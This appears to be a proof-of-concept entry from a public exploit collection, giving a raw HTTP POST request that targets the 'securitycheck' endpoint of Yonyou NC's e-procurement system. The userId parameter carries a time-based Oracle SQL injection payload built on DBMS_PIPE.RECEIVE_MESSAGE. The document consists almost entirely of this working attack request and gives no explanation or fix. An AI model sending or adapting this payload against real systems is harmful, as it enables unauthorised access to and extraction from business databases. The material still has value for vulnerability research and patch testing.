# yonyou_securitycheck_sqli
from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8Bnc%E7%94%B5%E5%AD%90%E9%87%87%E8%B4%AD%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9Fsecuritycheck%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5.md
2024.5.27
```
POST /ebs/securitycheck HTTP/1.1
Host: ip
Content-Length: 237
Method: POST securitycheck HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://ip
Referer: http://ip/ebs/core/login/login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=691A17DA3C872E1E35BACBE499022DE4.server; JSESSIONID=D80A3F043CD6E898C2076206848019D9.server
Connection: close

&accountCode=ERP%E7%B3%BB%E7%BB%9F&accountCodeValue=0001&datasource=design&corpCode=&maxWindow=0&compressStream=1&corpName=&workdate=123-09-22&userId=11' AND 1129=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(121)||CHR(69)||CHR(110),5) AND 'Fjnc'='Fjnc&password=11&&pageUniqueId=328c7f3e-aea1-4bcf-bd91-05e0d2804719&pageId=login&isAjax=1
```
